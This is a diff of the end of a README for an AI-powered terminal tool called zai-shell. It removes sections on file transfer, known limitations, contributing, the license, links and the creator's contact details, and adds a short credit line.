-# 6. File transfer with verification
-Helper: zai send "backup.zip" to Host
-→ Sending encrypted: 100%
-Host: share accept
-→ MD5 verified ✓, File saved
-
-# All communication encrypted end-to-end
-```
-
----
-
-## 🐛 Known Limitations
-
-- **Offline mode**: ~5GB download, slower on CPU
-- **GUI automation**: Requires display environment
-- **Non-English characters**: 95% success with 5-retry system
-- **Free API tier**: Rate limits (use eco/offline mode)
-- **ChromaDB memory**: Separate installation
-- **Terminal sharing**: Requires port forwarding for remote access (use ngrok for easy global access)
-- **E2E encryption**: Both parties must use same password; no password recovery
-
----
-
-## 🤝 Contributing
-
-**Ways to help:**
-- 🐛 Report bugs via [GitHub Issues](https://github.com/TaklaXBR/zai-shell/issues)
-- 💡 Suggest features
-- 🔧 Submit pull requests
-- 📝 Improve documentation
-- 🌍 Add shell configurations
-- 🔐 Security audits for encryption implementation
-
-**Good first issues:**
-- Shell configuration examples (Nushell, Fish)
-- Encoding detection for other languages
-- Automated test suite
-- Code templates library
-- Performance profiling
-- Additional encryption algorithms
-
----
-
-## 📝 License
-
-**GNU Affero General Public License v3.0**
-
-Open source, free to use and modify.
-
----
-
-## 🔗 Links
-
-- **GitHub**: [TaklaXBR/zai-shell](https://github.com/TaklaXBR/zai-shell)
-- **Legacy Versions**: Check `legacy/` folder for older releases
-
----
-
-## 📧 Contact
-
-**Creator:** Ömer Efe Başol
-**Role:** Independent Researcher & Lead Developer
-**Age:** 15
-**Email:** oe67111@gmail.com
-**GitHub:** [@TaklaXBR](https://github.com/TaklaXBR)
-
----
-
-<div align="center">
-
-⭐ **Star this repo if ZAI saved your terminal session!** ⭐
-
-**Built with ❤️ by [@TaklaXBR](https://github.com/TaklaXBR) | Age 15 | Turkey 🇹🇷**
-
-</div>
+**Made with ❤️ by @TaklaXBR | Turkey 🇹🇷**
